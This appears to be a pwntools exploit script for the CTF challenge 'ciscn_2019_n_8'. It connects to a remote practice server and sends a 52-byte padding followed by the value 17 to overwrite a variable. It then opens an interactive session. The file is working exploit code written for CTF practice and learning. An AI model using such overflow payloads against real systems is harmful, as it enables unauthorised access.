#Made by fly_autumn
#reverse?
from pwn import *
#p = process("./ciscn_2019_n_8")
p = remote("node5.buuoj.cn",27874)
elf = ELF("./ciscn_2019_n_8")
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
context(os="linux",arch="amd64")

p.recvuntil(b"?")
p.sendline(b"A"*52+p32(17))

p.interactive()
